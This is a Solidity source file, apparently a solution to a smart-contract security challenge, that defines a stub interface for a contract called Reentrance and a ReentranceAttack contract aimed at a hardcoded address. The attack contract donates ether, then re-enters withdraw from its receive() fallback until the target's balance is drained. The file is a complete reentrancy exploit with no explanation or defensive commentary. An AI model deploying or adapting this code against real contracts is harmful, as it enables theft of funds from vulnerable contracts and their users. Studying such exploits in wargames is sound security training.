// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrance {

  function donate(address _to) public payable {}

  function balanceOf(address _who) public view returns (uint balance) {}

  function withdraw(uint _amount) public {}

  receive() external payable {}
}

contract ReentranceAttack{
    Reentrance public originalContract = Reentrance(payable(0x0C57C2312a750210EE9ae6CDDB0191f1c9B1b1FC));

    uint initialDeposit;

    function callWithdraw() private {
        uint totalRemainingBalance = address(originalContract).balance;
        bool keep_going = totalRemainingBalance >0;
        if(keep_going) {
            uint256 amountToWithdraw = initialDeposit < totalRemainingBalance ? initialDeposit : totalRemainingBalance;
            originalContract.withdraw(amountToWithdraw);
        }
    }

    function attack() public payable {
        initialDeposit = msg.value;
        originalContract.donate{ value : initialDeposit}(address(this));
        callWithdraw();
    }

    receive() external payable{
        callWithdraw();
    }
}